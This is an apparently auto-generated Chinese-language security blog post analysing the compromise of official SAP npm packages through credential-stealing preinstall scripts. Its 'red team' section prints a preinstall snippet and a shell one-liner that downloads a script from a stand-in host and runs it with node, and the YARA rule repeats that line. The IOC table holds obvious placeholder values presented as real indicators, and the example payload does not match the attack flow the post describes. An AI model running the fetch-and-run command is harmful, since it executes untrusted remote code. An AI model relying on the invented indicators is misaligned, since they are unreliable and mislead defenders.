---
layout: post
title:  "Official SAP npm packages compromised to steal credentials"
date:   2026-04-30 02:14:11 +0000
categories: [security]
severity: critical
---

# 🚨 解析 SAP npm 套件遭 TeamPCP 供應鏈攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (資訊洩露)
> * **關鍵技術**: `npm` 套件劫持、`preinstall` 腳本、`Bun` JavaScript 執行環境、記憶體掃描

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: SAP 官方的 `npm` 套件 (`@cap-js/sqlite`、`@cap-js/postgres`、`@cap-js/db-service` 和 `mbt`) 被修改以包含惡意的 `preinstall` 腳本，該腳本會在套件安裝時自動執行。
* **攻擊流程圖解**:
	1. 安裝受影響的 `npm` 套件。
	2. `preinstall` 腳本被執行，下載並執行 `Bun` JavaScript 執行環境。
	3. `Bun` 執行環境執行惡意的 `execution.js` 腳本，該腳本會竊取各種憑證和驗證令牌。
* **受影響元件**: 受影響的 `npm` 套件版本為 `@cap-js/sqlite` v2.2.2、`@cap-js/postgres` v2.2.2、`@cap-js/db-service` v2.10.1 和 `mbt` v1.2.48。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有權限安裝 `npm` 套件。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意的 preinstall 腳本
    const childProcess = require('child_process');
    childProcess.exec('curl -s https://example.com/malicious-script.js | node');
    
    ```
*範例指令*:

```

bash
curl -s https://example.com/malicious-script.js | node

```
* **繞過技術**: 可以使用 `npm` 套件的 `preinstall` 腳本來繞過安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/malicious-script.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_script {
      meta:
        description = "Detects malicious script"
      strings:
        $a = "curl -s https://example.com/malicious-script.js | node"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 更新受影響的 `npm` 套件版本，並設定 `npm` 套件的 `preinstall` 腳本為空。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: Node.js 的套件管理器，允許開發者輕鬆地安裝和管理套件。
* **preinstall 腳本**: `npm` 套件安裝前執行的腳本，通常用於設定套件的環境。
* **Bun JavaScript 執行環境**: 一種 JavaScript 執行環境，允許開發者執行 JavaScript 代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/official-sap-npm-packages-compromised-to-steal-credentials/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


